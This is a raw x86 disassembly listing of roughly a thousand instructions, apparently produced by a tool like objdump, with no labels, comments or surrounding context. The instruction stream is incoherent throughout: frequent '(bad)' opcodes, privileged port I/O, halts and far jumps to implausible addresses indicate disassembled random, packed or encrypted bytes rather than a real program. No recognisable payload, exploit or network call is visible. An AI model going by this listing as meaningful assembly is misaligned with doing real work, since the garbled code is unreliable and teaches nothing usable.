  41abfb:	(bad)  
  41abfc:	push   ebx
  41abfd:	arpl   WORD PTR [esi],dx
  41abff:	mov    ds:0x66ff88c5,eax
  41ac04:	jo     0x41abb7
  41ac06:	js     0x41abb4
  41ac08:	jb     0x41ac38
  41ac0a:	cld    
  41ac0b:	(bad)  
  41ac0e:	ret    
  41ac0f:	or     edx,DWORD PTR [edi]
  41ac11:	mov    bh,0x64
  41ac13:	fucomi st,st(6)
  41ac15:	neg    DWORD PTR ds:0xf8e6025f
  41ac1b:	in     al,dx
  41ac1c:	pop    edx
  41ac1d:	jo     0x41abd7
  41ac1f:	ret    0x11aa
  41ac22:	stos   BYTE PTR es:[edi],al
  41ac23:	mov    gs,WORD PTR [edi+edi*1-0x1da780e]
  41ac2a:	rol    DWORD PTR [ecx],1
  41ac2c:	cdq    
  41ac2d:	sbb    BYTE PTR [ebx-0x6fd74b78],cl
  41ac33:	mov    DWORD PTR [ecx],edx
  41ac35:	repz sub eax,0xb668492c
  41ac3b:	fidivr WORD PTR [esp+eax*2]
  41ac3e:	mov    al,0xbe
  41ac40:	push   esp
  41ac41:	leave  
  41ac42:	fadd   DWORD PTR [edx]
  41ac44:	popf   
  41ac45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac46:	and    BYTE PTR [ecx+0x36],ah
  41ac49:	(bad)  [eax]
  41ac4b:	dec    ebx
  41ac4c:	add    al,0x7a
  41ac4e:	xor    eax,0x83494cf1
  41ac53:	sub    al,0x9
  41ac55:	daa    
  41ac56:	bound  ebp,QWORD PTR [esi-0x5]
  41ac59:	sbb    DWORD PTR [esi+0x79],0x7237df6c
  41ac60:	xor    BYTE PTR [esi+ebx*1],ch
  41ac63:	sbb    al,dh
  41ac65:	mov    ecx,ebp
  41ac67:	outs   dx,DWORD PTR ds:[esi]
  41ac68:	rep lods eax,DWORD PTR ds:[esi]
  41ac6a:	sub    dh,bl
  41ac6c:	out    dx,al
  41ac6d:	int    0x7b
  41ac6f:	loop   0x41ac90
  41ac71:	hlt    
  41ac72:	jl     0x41ac7f
  41ac74:	in     al,dx
  41ac75:	or     al,0xae
  41ac77:	xchg   ebx,eax
  41ac78:	mov    al,BYTE PTR [edi-0x2b]
  41ac7b:	xor    bl,BYTE PTR [edi-0x2d]
  41ac7e:	mov    ebx,0xbeb49176
  41ac83:	cs mov edx,0xa990ccfb
  41ac89:	mov    bl,0xec
  41ac8b:	popa   
  41ac8c:	sbb    BYTE PTR [ecx+0x21e35e9e],al
  41ac92:	cld    
  41ac93:	dec    edx
  41ac94:	lods   al,BYTE PTR ds:[esi]
  41ac95:	outs   dx,DWORD PTR ds:[esi]
  41ac96:	mov    dl,0x84
  41ac98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac99:	push   ebp
  41ac9a:	sbb    BYTE PTR [ebp+0x448c617b],cl
  41aca0:	pop    ds
  41aca1:	cs enter 0xf5e1,0xc1
  41aca6:	pop    esi
  41aca7:	aas    
  41aca8:	retf   0xeaf9
  41acab:	sub    eax,0x80cc618f
  41acb0:	je     0x41ac41
  41acb2:	xchg   ebx,eax
  41acb3:	dec    edx
  41acb4:	(bad)  
  41acb5:	hlt    
  41acb6:	xor    BYTE PTR [ebp+ecx*2-0x69],bl
  41acba:	outs   dx,DWORD PTR ds:[esi]
  41acbb:	cld    
  41acbc:	lahf   
  41acbd:	adc    edx,DWORD PTR [edx+edi*4+0x57]
  41acc1:	(bad)
  41acc5:	lds    edx,FWORD PTR [edi-0x583cc20c]
  41accb:	mov    ch,0xc2
  41accd:	inc    ebp
  41acce:	push   ebp
  41accf:	jl     0x41ad3e
  41acd1:	out    dx,al
  41acd2:	cmc    
  41acd3:	test   al,0x2b
  41acd5:	lahf   
  41acd6:	sub    eax,0xb42848c6
  41acdb:	gs mov ah,0x32
  41acde:	jae    0x41acae
  41ace0:	bound  edx,QWORD PTR [edi]
  41ace2:	popf   
  41ace3:	xor    BYTE PTR [edx+0x4c],0xe5
  41ace7:	sbb    bh,BYTE PTR [ebp+0x69c84bd1]
  41aced:	jns    0x41ad09
  41acef:	or     DWORD PTR [ebp-0x576e38fd],edx
  41acf5:	outs   dx,DWORD PTR ds:[esi]
  41acf6:	arpl   cx,di
  41acf8:	int    0xf2
  41acfa:	inc    BYTE PTR [edx]
  41acfc:	(bad)  
  41acfd:	out    dx,al
  41acfe:	rcr    BYTE PTR [esi-0x198e825b],0x78
  41ad05:	ins    DWORD PTR es:[edi],dx
  41ad06:	pop    ss
  41ad07:	lods   eax,DWORD PTR ds:[esi]
  41ad08:	add    DWORD PTR [ebx+0x6d0bac6d],edx
  41ad0e:	je     0x41aca8
  41ad10:	push   ss
  41ad11:	mov    ebx,0x650b354
  41ad16:	fsubr  st,st(1)
  41ad18:	scas   al,BYTE PTR es:[edi]
  41ad19:	test   BYTE PTR [ecx-0xc],bh
  41ad1c:	cli    
  41ad1d:	pop    ds
  41ad1e:	in     al,dx
  41ad1f:	mov    edx,0x656fa2ad
  41ad24:	adc    al,ch
  41ad26:	jb     0x41ad6b
  41ad28:	sub    al,0xb6
  41ad2a:	outs   dx,DWORD PTR ds:[esi]
  41ad2b:	test   BYTE PTR [edi+0x3ded07eb],ah
  41ad31:	pushf  
  41ad32:	cmp    al,0x8
  41ad34:	sub    eax,0x7b5c5e76
  41ad39:	ins    BYTE PTR es:[edi],dx
  41ad3a:	sub    eax,0x3c030e36
  41ad3f:	fcmovne st,st(2)
  41ad41:	in     al,0x26
  41ad43:	or     ecx,DWORD PTR [ecx-0x2b]
  41ad46:	inc    esp
  41ad47:	xchg   DWORD PTR [eax-0x7419f9f1],ecx
  41ad4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad4e:	idiv   DWORD PTR [eax]
  41ad50:	rol    BYTE PTR [eax],0x6d
  41ad53:	fs mov ah,0xa9
  41ad56:	imul   esi,ebx,0x4
  41ad59:	add    eax,0x1c1f0de4
  41ad5e:	and    bh,al
  41ad60:	jnp    0x41ad7e
  41ad62:	inc    esi
  41ad63:	stos   BYTE PTR es:[edi],al
  41ad64:	cmc    
  41ad65:	mov    dl,0x5b
  41ad67:	fwait
  41ad68:	pop    ebx
  41ad69:	jle    0x41adc5
  41ad6b:	cmp    eax,0x96ed7712
  41ad70:	mov    esp,0xc7705ab0
  41ad75:	sbb    DWORD PTR [eax],esi
  41ad77:	ret    0x19dd
  41ad7a:	pop    edx
  41ad7b:	adc    ch,0xb1
  41ad7e:	out    0xcb,eax
  41ad80:	mov    eax,ds:0xa1b4ba03
  41ad85:	(bad)  
  41ad86:	in     eax,0x1f
  41ad88:	imul   eax,DWORD PTR [esi],0x3f
  41ad8b:	outs   dx,BYTE PTR ds:[esi]
  41ad8c:	retf   
  41ad8d:	xlat   BYTE PTR ds:[ebx]
  41ad8e:	mov    ebp,0x48ceb2f
  41ad93:	xchg   edx,eax
  41ad95:	mov    dh,0x2a
  41ad97:	fcmovu st,st(4)
  41ad99:	scas   eax,DWORD PTR es:[edi]
  41ad9a:	push   ss
  41ad9b:	mov    eax,0xe9796b0c
  41ada0:	and    al,0x59
  41ada2:	pop    edx
  41ada3:	mov    ebp,eax
  41ada5:	or     BYTE PTR ds:0xafe539af,ah
  41adab:	repnz cmp al,BYTE PTR [eax]
  41adae:	mov    ds:0x34c405b4,al
  41adb3:	aad    0x79
  41adb5:	and    DWORD PTR [edx],edx
  41adb7:	pushf  
  41adb8:	ret    
  41adb9:	xlat   BYTE PTR ds:[ebx]
  41adba:	pop    edi
  41adbb:	cmp    eax,0x66bd801a
  41adc0:	in     eax,0xa9
  41adc2:	(bad)  
  41adc3:	popa   
  41adc4:	pop    ds
  41adc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adc6:	pop    esp
  41adc7:	in     eax,dx
  41adc8:	mov    al,0xb7
  41adca:	mov    DWORD PTR [eax],edi
  41adcc:	pop    edi
  41adcd:	outs   dx,BYTE PTR ds:[esi]
  41adce:	xchg   edi,eax
  41adcf:	mov    dl,0x83
  41add1:	lahf   
  41add2:	mov    ah,0xfc
  41add4:	jl     0x41ada2
  41add6:	pop    ss
  41add7:	inc    ebp
  41add8:	pop    ss
  41add9:	and    eax,0xfdca86da
  41adde:	repnz pop edx
  41ade0:	outs   dx,DWORD PTR ds:[esi]
  41ade1:	lahf   
  41ade2:	mov    ecx,edi
  41ade4:	test   bh,cl
  41ade6:	jl     0x41ae4e
  41ade8:	test   eax,0xd894ff26
  41aded:	loop   0x41ae31
  41adef:	push   0xf88a069b
  41adf4:	popf   
  41adf5:	nop
  41adf6:	ins    DWORD PTR es:[edi],dx
  41adf7:	repz (bad) 
  41adf9:	cli    
  41adfa:	mov    al,ds:0xa9f3a0c8
  41adff:	shl    DWORD PTR [eax],cl
  41ae01:	push   ebx
  41ae02:	mov    al,ds:0x6efd5f4b
  41ae07:	inc    edi
  41ae08:	mov    ds:0x5758e15d,al
  41ae0d:	rcl    DWORD PTR [edx],0x4d
  41ae10:	mov    BYTE PTR [eax+0x7b],bh
  41ae13:	sub    BYTE PTR [ebp+edx*8+0x6c],cl
  41ae17:	loop   0x41ae2c
  41ae19:	lds    ebp,FWORD PTR [ebx]
  41ae1b:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41ae1d:	pushf  
  41ae1e:	and    edx,edi
  41ae20:	fwait
  41ae21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae22:	push   ds
  41ae23:	pop    es
  41ae24:	adc    al,0x67
  41ae26:	or     ebp,DWORD PTR [ecx]
  41ae28:	mov    al,0x9a
  41ae2a:	fbld   TBYTE PTR [ebx]
  41ae2c:	aad    0xa4
  41ae2e:	mov    BYTE PTR [ebx+0x5740080],ah
  41ae34:	into   
  41ae35:	cmp    BYTE PTR [ebx],bh
  41ae37:	adc    eax,0xf3617411
  41ae3c:	inc    eax
  41ae3d:	es jnp 0xf19c741
  41ae44:	cmp    DWORD PTR [edx],ebx
  41ae46:	in     eax,0x4f
  41ae48:	loope  0x41ae92
  41ae4a:	cmp    al,0xcd
  41ae4c:	sub    ch,BYTE PTR [esp+edi*4+0x7a]
  41ae50:	sbb    eax,0xbac06e41
  41ae55:	jg     0x41aeb0
  41ae57:	push   esp
  41ae58:	and    DWORD PTR ds:0xe2b5d0f,ebp
  41ae5e:	(bad)  
  41ae5f:	fist   DWORD PTR [eax]
  41ae61:	fnstenv [edx+0x17]
  41ae64:	push   ebx
  41ae65:	addr16 push edi
  41ae67:	mov    DWORD PTR [esi],0xe75c71d5
  41ae6d:	adc    edx,esi
  41ae6f:	popa   
  41ae70:	and    BYTE PTR [edi],dl
  41ae72:	in     al,0x1b
  41ae74:	xchg   edx,eax
  41ae75:	popa   
  41ae76:	jno    0x41ae2f
  41ae78:	stos   BYTE PTR es:[edi],al
  41ae79:	mov    ebx,0xcbfdc0b
  41ae7e:	pop    ecx
  41ae7f:	and    ebx,edx
  41ae81:	push   cs
  41ae82:	mov    ah,0x56
  41ae84:	sbb    al,0x16
  41ae86:	in     eax,0xc3
  41ae88:	(bad)  
  41ae89:	sub    ah,BYTE PTR [esi]
  41ae8b:	popa   
  41ae8c:	jg     0x41aebd
  41ae8e:	sahf   
  41ae8f:	and    ch,cl
  41ae91:	jmp    0x4f29:0xc95bd4cd
  41ae98:	sti    
  41ae99:	adc    eax,0xfa30cd01
  41ae9e:	nop
  41ae9f:	xor    eax,0x298ffaf6
  41aea4:	cmp    BYTE PTR [edi-0x27],ch
  41aea7:	inc    eax
  41aea8:	sub    dh,dh
  41aeaa:	stos   DWORD PTR es:[edi],eax
  41aeab:	dec    ebx
  41aeac:	repnz inc BYTE PTR [esp+eax*8-0xa150e0e]
  41aeb4:	xchg   BYTE PTR [eax+0x31d9fd4a],al
  41aeba:	mov    esi,0x6709c82b
  41aebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aec0:	stos   BYTE PTR es:[edi],al
  41aec1:	lahf   
  41aec2:	je     0x41ae81
  41aec4:	out    dx,eax
  41aec5:	mov    esp,0xb538fa8e
  41aeca:	(bad)  
  41aecb:	inc    esi
  41aecc:	fild   WORD PTR [eax+0x19]
  41aecf:	mov    DWORD PTR [edi+0x4],edx
  41aed2:	jmp    0x41af51
  41aed4:	push   cs
  41aed5:	cli    
  41aed6:	or     DWORD PTR [ebp+0x7ab534ee],esi
  41aedc:	dec    DWORD PTR [edi]
  41aede:	loop   0x41ae6d
  41aee0:	mov    DWORD PTR [edi],ebx
  41aee2:	mov    dh,0x38
  41aee4:	sub    al,al
  41aee6:	loope  0x41af12
  41aee8:	mov    ebx,0xfce6b205
  41aeed:	bsf    edi,DWORD PTR [esi+0x40898622]
  41aef4:	sbb    esp,DWORD PTR [esi-0x11b8907e]
  41aefa:	cmp    ah,dh
  41aefc:	int3   
  41aefd:	inc    ebp
  41aefe:	jp     0x41aeb0
  41af00:	cmp    ch,BYTE PTR [ecx]
  41af02:	xchg   ebp,eax
  41af03:	fmul   st(0),st
  41af05:	inc    eax
  41af06:	xor    ah,BYTE PTR es:[edi-0x23]
  41af0a:	bound  esp,QWORD PTR [eax-0x60]
  41af0d:	stos   DWORD PTR es:[edi],eax
  41af0e:	push   esi
  41af0f:	pusha  
  41af10:	scas   eax,DWORD PTR es:[edi]
  41af11:	pop    esp
  41af12:	outs   dx,BYTE PTR ds:[esi]
  41af13:	fdiv   QWORD PTR [ebx+0x26]
  41af16:	imul   eax,edi,0x152ce81d
  41af1c:	shl    BYTE PTR [ecx],1
  41af1e:	dec    esi
  41af1f:	sub    ecx,DWORD PTR [ebx+edi*1-0x59]
  41af23:	js     0x41aead
  41af25:	out    dx,al
  41af26:	jb     0x41af17
  41af28:	add    al,0x46
  41af2a:	mov    ebx,0x92318f39
  41af2f:	mov    dl,0x13
  41af31:	inc    ebp
  41af32:	mov    eax,0x7155987b
  41af37:	cs retf 0x7ab1
  41af3b:	scas   eax,DWORD PTR es:[edi]
  41af3c:	xor    BYTE PTR [ebx-0x48],0xc7
  41af40:	sub    bl,BYTE PTR [eax+0x58803a60]
  41af46:	cwde   
  41af47:	mov    ch,0xc6
  41af49:	rol    BYTE PTR [esi-0x640052fd],cl
  41af4f:	cld    
  41af50:	mov    bl,0x1e
  41af52:	frstor [ebp+0x5fe415bb]
  41af58:	(bad)  
  41af59:	ficom  WORD PTR [esi+0x22fc3210]
  41af5f:	mov    eax,ds:0x64668d51
  41af64:	fdivr  QWORD PTR [edx]
  41af66:	xchg   ebp,eax
  41af67:	push   esp
  41af68:	cmp    al,BYTE PTR [edi]
  41af6a:	jge    0x41af59
  41af6c:	jae    0x41aef4
  41af6e:	lods   al,BYTE PTR gs:[esi]
  41af70:	mov    dh,BYTE PTR [ebp+esi*2-0x1d]
  41af74:	(bad)  [eax+edx*2-0x2134f52f]
  41af7b:	add    BYTE PTR [ebx-0x1b],0x12
  41af7f:	jmp    0x582d:0x202d92da
  41af86:	rcl    BYTE PTR [ecx+ecx*2+0x5435422d],cl
  41af8d:	lods   eax,DWORD PTR ds:[esi]
  41af8e:	stos   BYTE PTR es:[edi],al
  41af8f:	out    dx,eax
  41af90:	mov    cl,0x86
  41af92:	xor    dh,BYTE PTR [ebp+edx*2-0x47f8fe9d]
  41af99:	push   eax
  41af9a:	(bad)  
  41af9b:	out    0xe1,eax
  41af9d:	pushf  
  41af9e:	adc    BYTE PTR [edx],dl
  41afa0:	xchg   edx,eax
  41afa1:	in     al,0xea
  41afa3:	in     al,0x82
  41afa5:	sub    dl,BYTE PTR [ebx]
  41afa7:	push   eax
  41afa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afa9:	push   ds
  41afaa:	xor    BYTE PTR [ecx+0x2d],al
  41afad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afae:	lods   al,BYTE PTR ds:[esi]
  41afaf:	jns    0x41b02a
  41afb1:	xchg   BYTE PTR [ecx-0x32c0d3d],dh
  41afb7:	in     eax,0xf2
  41afb9:	push   es
  41afba:	adc    al,0x42
  41afbc:	pop    ecx
  41afbd:	xchg   edi,eax
  41afbe:	push   0xc798e14c
  41afc3:	(bad)  
  41afc4:	(bad)  
  41afc5:	pop    ss
  41afc6:	xor    BYTE PTR [ecx+edx*2],al
  41afc9:	pop    ds
  41afca:	jb     0x41b043
  41afcc:	rcl    BYTE PTR [ebx+0x7f6c2395],1
  41afd2:	inc    ecx
  41afd3:	sbb    BYTE PTR [ebx+0x6ae8b5d8],dl
  41afd9:	cmp    eax,0xc724fad
  41afde:	ins    BYTE PTR es:[edi],dx
  41afdf:	xor    DWORD PTR [edx],ebp
  41afe1:	or     BYTE PTR [edi+ecx*1+0x50],bh
  41afe5:	mov    ah,BYTE PTR [esi]
  41afe7:	sub    ecx,esp
  41afe9:	and    edx,edi
  41afeb:	shr    BYTE PTR [edi+0x70332994],cl
  41aff1:	daa    
  41aff2:	jmp    0x41af81
  41aff4:	imul   esp,DWORD PTR [ecx-0x3bcd5a51],0x45
  41affb:	(bad)  
  41affc:	repz hlt 
  41affe:	sub    eax,DWORD PTR [edi-0x3a]
  41b001:	xor    BYTE PTR [ebp-0x16],bh
  41b004:	std    
  41b005:	jle    0x41afcb
  41b007:	adc    eax,0xa2013f9a
  41b00c:	dec    edi
  41b00d:	xchg   esi,eax
  41b00e:	jne    0x41b06a
  41b010:	or     al,0xb5
  41b012:	push   cs
  41b013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b014:	jbe    0x41b004
  41b016:	ror    DWORD PTR ds:[edx],0x16
  41b01a:	add    ebx,esi
  41b01c:	das    
  41b01d:	out    dx,al
  41b01e:	add    DWORD PTR [ecx+0x5d],ecx
  41b021:	add    ecx,DWORD PTR [ebx+eax*4-0x4a630b8f]
  41b028:	clc    
  41b029:	(bad)  
  41b02a:	es xchg ecx,eax
  41b02c:	sub    esi,DWORD PTR [edi+edi*4]
  41b02f:	in     eax,0x43
  41b031:	xchg   ebp,eax
  41b032:	mov    WORD PTR [ebx],gs
  41b034:	push   eax
  41b035:	and    DWORD PTR [ecx-0x16],0xffffffa4
  41b039:	or     al,0x4
  41b03b:	xchg   edx,eax
  41b03c:	pop    es
  41b03d:	pop    es
  41b03e:	mov    al,ds:0xcd8422f7
  41b043:	xor    esi,ebx
  41b045:	pop    es
  41b046:	mov    bl,BYTE PTR [ebp-0xe5240de]
  41b04c:	hlt    
  41b04d:	sbb    al,0xfb
  41b04f:	aam    0x63
  41b051:	pop    edx
  41b052:	mov    ecx,0xaa7e8955
  41b057:	mov    ch,0xe0
  41b059:	ds fsubr st(3),st
  41b05c:	and    al,0xe6
  41b05e:	mov    ebp,DWORD PTR [esp+edx*2]
  41b061:	sub    ecx,DWORD PTR [ebp-0x33592e05]
  41b067:	pop    eax
  41b068:	sbb    BYTE PTR [ebx+edx*8-0x2c],0x9d
  41b06d:	cmc    
  41b06e:	(bad)  
  41b06f:	cdq    
  41b070:	push   edx
  41b071:	sub    eax,0xe9516adb
  41b076:	out    dx,al
  41b077:	push   es
  41b078:	popa   
  41b079:	add    eax,ebx
  41b07b:	jge    0x41b04c
  41b07d:	cmp    DWORD PTR gs:[ecx+0x4d],ecx
  41b081:	xor    esp,DWORD PTR ds:0x5f118628
  41b087:	xor    ch,BYTE PTR [ecx+0xc]
  41b08a:	retf   0x7c11
  41b08d:	lods   eax,DWORD PTR ds:[esi]
  41b08e:	fcmovbe st,st(2)
  41b090:	xor    cl,BYTE PTR [edx]
  41b092:	pop    ebp
  41b093:	not    dh
  41b095:	cmp    DWORD PTR [eax],0xc0bfd8b4
  41b09b:	mov    al,BYTE PTR [edi-0x361f52f5]
  41b0a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0a2:	jnp    0x41b02f
  41b0a4:	jmp    DWORD PTR [esi]
  41b0a6:	or     BYTE PTR [ebx+0x7a],bh
  41b0a9:	mov    bh,BYTE PTR [ebx]
  41b0ab:	test   DWORD PTR [esp+esi*4],eax
  41b0ae:	ret    0xdaf3
  41b0b1:	aaa    
  41b0b2:	sub    DWORD PTR [eax],eax
  41b0b4:	add    bl,BYTE PTR [ecx-0x24042123]
  41b0ba:	push   ebx
  41b0bb:	jae    0x41b06b
  41b0bd:	mov    bl,0x43
  41b0bf:	push   ebx
  41b0c0:	js     0x41b0e0
  41b0c2:	gs out dx,eax
  41b0c4:	dec    edi
  41b0c5:	call   0x1803:0x9efa440d
  41b0cc:	xor    ebx,ebp
  41b0ce:	dec    BYTE PTR [ecx-0x3404f693]
  41b0d4:	xchg   ebx,eax
  41b0d5:	outs   dx,BYTE PTR ds:[esi]
  41b0d6:	mov    eax,ds:0x80d60a95
  41b0db:	fcom   DWORD PTR [edi*8+0x36783f86]
  41b0e2:	cmp    DWORD PTR [edx-0x6e883800],esi
  41b0e8:	lods   eax,DWORD PTR ds:[esi]
  41b0e9:	xchg   esp,eax
  41b0ea:	aad    0x12
  41b0ec:	xor    bh,cl
  41b0ee:	nop
  41b0ef:	imul   edx,DWORD PTR [esi],0xda2a685e
  41b0f5:	xor    eax,0xe9eaa616
  41b0fa:	xchg   al,bl
  41b0fc:	jmp    0x41b113
  41b0fe:	xor    WORD PTR [edi-0xb],0xcb42
  41b104:	daa    
  41b105:	adc    DWORD PTR [ecx+0x5597e8d4],esp
  41b10b:	mov    edx,0x1c123d34
  41b110:	or     ecx,DWORD PTR [ebp+0x790ac87]
  41b116:	pop    ds
  41b117:	out    dx,eax
  41b118:	pop    esp
  41b119:	es stc 
  41b11b:	push   eax
  41b11c:	(bad)  
  41b11d:	fld    DWORD PTR [edi]
  41b11f:	pop    ds
  41b120:	rcpps  xmm1,XMMWORD PTR ds:0x15bce479
  41b127:	and    BYTE PTR [edx-0x16],0xb9
  41b12b:	jo     0x41b111
  41b12d:	inc    esi
  41b12e:	test   al,0xb6
  41b130:	lods   eax,DWORD PTR ds:[esi]
  41b131:	call   0xe7fd75ef
  41b136:	or     al,0xdd
  41b138:	push   edi
  41b139:	xor    al,BYTE PTR [ebp-0x6baa0aec]
  41b13f:	out    0x49,al
  41b141:	scas   eax,DWORD PTR es:[edi]
  41b142:	sbb    esi,DWORD PTR [ebx-0x258fc567]
  41b148:	jecxz  0x41b0f4
  41b14a:	adc    dh,BYTE PTR [ecx-0x53812b50]
  41b150:	and    ebp,DWORD PTR [edi-0x3c]
  41b153:	or     eax,0x861f854b
  41b158:	stos   DWORD PTR es:[edi],eax
  41b159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b15a:	ret    
  41b15b:	and    ecx,DWORD PTR [eax]
  41b15d:	fsubr  DWORD PTR [eax+0x25b9aa2f]
  41b163:	lds    edx,FWORD PTR [esi]
  41b165:	add    al,ch
  41b167:	mov    WORD PTR [edi+0x654da],es
  41b16d:	pushf  
  41b16e:	pusha  
  41b16f:	mov    BYTE PTR [eax],ah
  41b171:	shl    BYTE PTR [ebp-0x1b771fb4],1
  41b177:	nop
  41b178:	(bad)  
  41b179:	pop    esp
  41b17a:	xchg   esp,eax
  41b17b:	xchg   ebx,eax
  41b17c:	cmc    
  41b17d:	in     al,dx
  41b17e:	push   edx
  41b17f:	push   esi
  41b180:	jbe    0x41b11d
  41b182:	push   esp
  41b183:	inc    ebx
  41b184:	xor    eax,0x35bccd0e
  41b189:	mov    dh,0x30
  41b18b:	enter  0x3626,0x79
  41b18f:	and    DWORD PTR [ebp-0x4d],ebp
  41b192:	call   0xce216dea
  41b197:	jmp    0x93904346
  41b19c:	cmc    
  41b19d:	inc    edi
  41b19e:	scas   eax,DWORD PTR es:[edi]
  41b19f:	mov    BYTE PTR [eax-0x7fe7f0d8],cl
  41b1a5:	les    ecx,FWORD PTR [esi-0x6d]
  41b1a8:	aaa    
  41b1a9:	mov    bh,0xd6
  41b1ab:	lods   eax,DWORD PTR ds:[esi]
  41b1ac:	push   esp
  41b1ad:	push   0x69
  41b1af:	mov    bl,0xec
  41b1b1:	outs   dx,DWORD PTR ds:[esi]
  41b1b2:	jp     0x41b1bd
  41b1b4:	push   ds
  41b1b5:	sti    
  41b1b6:	dec    ecx
  41b1b7:	out    dx,al
  41b1b8:	inc    ebx
  41b1b9:	and    BYTE PTR [edi+0x2d],0xd0
  41b1bd:	jle    0x41b140
  41b1bf:	cwde   
  41b1c0:	das    
  41b1c1:	mul    BYTE PTR [esi+esi*1-0x7a6b0940]
  41b1c8:	mov    BYTE PTR [ecx-0x3c],bl
  41b1cb:	inc    ebx
  41b1cc:	or     DWORD PTR [esi-0x6e39f51],ecx
  41b1d2:	pop    ds
  41b1d3:	xor    esi,DWORD PTR [ebx+eax*1+0x2054a2fc]
  41b1da:	add    al,0xc1
  41b1dc:	xor    BYTE PTR [edx-0x7e],bl
  41b1df:	sahf   
  41b1e0:	jbe    0x41b1f5
  41b1e2:	out    dx,al
  41b1e3:	and    ah,bh
  41b1e5:	push   0x29
  41b1e7:	jnp    0x41b257
  41b1e9:	pop    edi
  41b1ea:	fist   DWORD PTR [edi-0x353e1cef]
  41b1f0:	dec    ebp
  41b1f1:	sbb    DWORD PTR [esi],0x1d
  41b1f4:	cmp    esi,DWORD PTR ss:[ecx-0x1a]
  41b1f8:	push   ebx
  41b1f9:	and    BYTE PTR [ebx+0x71e1396c],al
  41b1ff:	dec    bp
  41b201:	pop    eax
  41b202:	mov    edx,0x996215cc
  41b207:	lea    edi,[ecx+0x44599988]
  41b20d:	sbb    edi,DWORD PTR [eax+0x7d]
  41b210:	sbb    eax,0xa421b83f
  41b215:	and    eax,0xb5af86a2
  41b21a:	cmc    
  41b21b:	ds (bad) 
  41b21d:	and    al,0xa2
  41b21f:	dec    edx
  41b220:	dec    edi
  41b221:	push   ebx
  41b222:	test   eax,0xa5d4da6e
  41b227:	rcr    DWORD PTR [ebx+0x16],cl
  41b22a:	dec    ecx
  41b22c:	mov    bh,0x45
  41b22e:	push   0xb7b19a64
  41b233:	dec    esi
  41b234:	sub    edi,DWORD PTR [esp+edi*2-0x223edaa5]
  41b23b:	mov    bl,0x6a
  41b23d:	jnp    0x41b1ed
  41b23f:	sub    al,0xb7
  41b241:	idiv   DWORD PTR [ebx+0x3166be9f]
  41b247:	jns    0x41b28d
  41b249:	sub    esp,ebx
  41b24b:	sub    BYTE PTR ds:[edx],dh
  41b24e:	in     eax,dx
  41b24f:	inc    ebp
  41b250:	dec    esi
  41b251:	mov    ebp,DWORD PTR [esi-0x45]
  41b254:	or     BYTE PTR [ebx-0x7f0a4385],bl
  41b25a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b25b:	call   0x5b333eec
  41b260:	xchg   edx,eax
  41b261:	jns    0x41b232
  41b263:	cli    
  41b264:	call   0x67fe79d1
  41b269:	clc    
  41b26a:	mov    ah,BYTE PTR [ebp-0x5fa9d3fa]
  41b270:	call   0xee7f:0x5718580
  41b277:	and    eax,0x5bfbecd7
  41b27c:	jecxz  0x41b220
  41b27e:	test   al,0x59
  41b280:	ror    BYTE PTR [esi-0xa],0x5c
  41b284:	ret    0x6a0f
  41b287:	mov    ds:0x28dd3dde,al
  41b28c:	pop    ds
  41b28d:	xor    edx,esp
  41b28f:	inc    esi
  41b290:	sbb    edx,DWORD PTR [ecx]
  41b292:	pop    esi
  41b293:	cmp    BYTE PTR [ecx+esi*8-0x1679657f],cl
  41b29a:	lock pushf 
  41b29c:	hlt    
  41b29d:	je     0x41b2ba
  41b29f:	shl    ebp,0x6c
  41b2a2:	push   esi
  41b2a3:	xor    al,BYTE PTR [eax]
  41b2a5:	sbb    eax,0x3c9a071d
  41b2aa:	ja     0x41b2f5
  41b2ac:	xchg   edx,eax
  41b2ad:	xchg   esp,eax
  41b2ae:	or     al,0xe7
  41b2b0:	jp     0x41b31b
  41b2b2:	outs   dx,BYTE PTR ds:[esi]
  41b2b3:	sub    al,0xc4
  41b2b5:	sbb    eax,0xd8c1d1d3
  41b2ba:	jno    0x41b2c9
  41b2bc:	cmp    ah,BYTE PTR [ecx+0x3829c9d2]
  41b2c2:	xor    ebp,ebx
  41b2c4:	jb     0x41b319
  41b2c6:	xchg   BYTE PTR [ecx-0x26],dl
  41b2c9:	jl     0x41b2a1
  41b2cb:	fcmovb st,st(6)
  41b2cd:	aad    0x3a
  41b2cf:	into   
  41b2d0:	pop    es
  41b2d1:	push   ecx
  41b2d2:	out    0xc0,eax
  41b2d4:	fdivr  DWORD PTR [esi-0x5d]
  41b2d7:	in     al,0x27
  41b2d9:	loopne 0x41b2c8
  41b2db:	or     esi,DWORD PTR [eax]
  41b2dd:	and    BYTE PTR [esi+0x7dbfd67b],ch
  41b2e3:	mov    ebx,0xc6a84096
  41b2e8:	ins    DWORD PTR es:[edi],dx
  41b2e9:	mov    eax,0x343ba246
  41b2ee:	cmp    DWORD PTR [eax+0x53],ebx
  41b2f1:	fwait
  41b2f2:	repnz mov DWORD PTR [edi-0x43],ebp
  41b2f6:	lods   eax,DWORD PTR ds:[esi]
  41b2f7:	dec    eax
  41b2f8:	bnd jl 0x41b292
  41b2fb:	aam    0x0
  41b2fd:	in     eax,0x89
  41b2ff:	retf   0x46ad
  41b302:	scas   al,BYTE PTR es:[edi]
  41b303:	in     al,dx
  41b304:	add    eax,0x7c4fa3ec
  41b309:	clc    
  41b30a:	jmp    0x976b396d
  41b30f:	inc    ecx
  41b310:	fnstenv [edi-0x4857c5a8]
  41b316:	daa    
  41b317:	loop   0x41b35d
  41b319:	repz fwait
  41b31b:	sbb    eax,0xf37bcde9
  41b320:	mov    al,ds:0x6f747002
  41b325:	pushf  
  41b326:	cwde   
  41b327:	mov    al,ds:0xa14adef1
  41b32c:	xchg   ecx,eax
  41b32d:	sbb    eax,0x32f4c5c0
  41b332:	push   ebp
